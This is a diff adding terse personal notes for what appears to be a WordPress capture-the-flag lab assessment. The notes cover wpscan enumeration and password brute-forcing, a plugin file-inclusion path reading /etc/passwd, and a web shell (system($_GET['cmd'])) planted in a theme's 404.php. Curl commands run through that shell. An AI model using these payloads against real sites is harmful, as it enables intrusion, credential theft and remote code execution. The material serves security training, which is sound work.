@@ -1,0 +1,43 @@
+============================================
+SKILLS ASSESSMENT
+
+1- use wpscan to get the wordpress version number
+2- use wpscan to get the wordpress theme in use
+3- use --wp-content-dir param to get the directory flag file in WPSCAN
+4- once wer'e inside the admin dashboard by doing bruteforce with wpscan to the password,
+   chack the only non-admin WordPress user.
+5- search in google for plugin name exploit and 
+   use /wp-admin/admin.php?page=download_report&report=users&status=all to 
+   redirect the file downlad and read the flag
+6- use wpscan to get the wordpress version plugins with params: -e ap and -e vp
+7- search for site-detir exploit and look at: 
+   /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+8- in the admin panel, go to theme editor, select "twenty seventeen" theme to edit, find "404 template (404.php)"
+    add: system($_GET['cmd']); inside the code, click below on "update file" 
+9- load or do curl to: /wp-content/themes/twentyseventeen/404.php?cmd=more%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
+
+
+
+
+
+
+============================================
+RESOURCES
+
+https://www.exploit-db.com/exploits/48698
+https://www.exploit-db.com/exploits/44340
+
+============================================
+PAYLOADS
+
+wpscan --url http://blog.inlanefreight.local/ -e ap -v --wp-content-dir wp-content
+
+http://blog.inlanefreight.local/wp-admin/plugin-editor.php?plugin=email-subscribers%2Femail-subscribers.php&Submit=Select
+
+curl -X GET "http://blog.inlanefreight.local/wp-content/plugins/site-editor/site-editor.php"
+
+/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+
+/wp-admin/admin.php?page=download_report&report=users&status=all
+
+curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=more%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
